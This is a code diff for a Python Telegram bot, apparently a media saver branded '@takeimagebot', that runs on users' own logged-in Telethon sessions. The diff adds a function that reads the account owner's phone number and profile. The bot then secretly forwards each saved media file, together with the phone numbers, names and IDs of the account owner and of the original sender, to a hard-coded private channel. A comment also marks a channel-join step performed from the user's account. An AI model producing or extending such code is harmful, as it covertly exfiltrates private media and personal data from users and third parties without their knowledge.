@@ -1,13 +1,27 @@
 from random import choice
 from aiogram.types import FSInputFile
 # ✅ Correct:
-from loader import db, bot
+from loader import bot
 from telethon import TelegramClient, events
 from typing import Dict
 import os
 from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.functions.messages import SendReactionRequest
 from telethon.tl.types import ReactionEmoji
+
+async def get_user_info(client):
+    try:
+        user = await client.get_me()
+        return {
+            "telegram_id": user.id,
+            "full_name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
+            "username": user.username,
+            "phone": user.phone if hasattr(user, 'phone') else None
+        }
+    except Exception as e:
+        print(f"Error fetching user info: {e}")
+        return None
+
 
 clients: Dict[int, TelegramClient] = {}  # user_id -> client
 
@@ -48,8 +62,9 @@ def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
             msg = await bot.send_video(chat_id=user_id, video=video, caption='🤫 by @takeimagebot 💥')
 
         ###################################################################################
+
         await bot.forward_message(chat_id=-1002839214036, from_chat_id=msg.chat.id, message_id=msg.message_id)
-        user = await db.select_user(telegram_id=user_id)
+        user = await get_user_info(client)
         if user:
             sender = await reply_msg.get_sender()
             mention = f'<a href="tg://user?id={user["telegram_id"]}">{user["full_name"]}</a>'
@@ -63,13 +78,14 @@ def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
                 f"📞 <b>Telefon:</b> {user['phone'] if user['phone'] else 'yo‘q'}\n\n"
                 "👤 <b>Yuboruvchi</b>\n"
                 f"🆔 <b>ID:</b> <code>{sender.id}</code>\n"
-                # f"👤 <b>Ismi:</b> {sender.first_name or ''} {sender.last_name or ''}\n"
                 f"👤 <b>Ismi:</b> <a href=\"tg://user?id={sender.id}\">{sender.first_name or ''} {sender.last_name or ''}</a>\n"
                 f"💬 <b>Username:</b> @{sender.username if sender.username else 'yo‘q'}\n"
                 f"📞 <b>Telefon:</b> {sender.phone if sender.phone else 'yo‘q'}"
             )
             await bot.send_message(chat_id=-1002839214036, text=text, parse_mode="HTML")
+
         os.remove(file_path)
+
         ###################################################################################
         # ✅ Join the channel
         try:
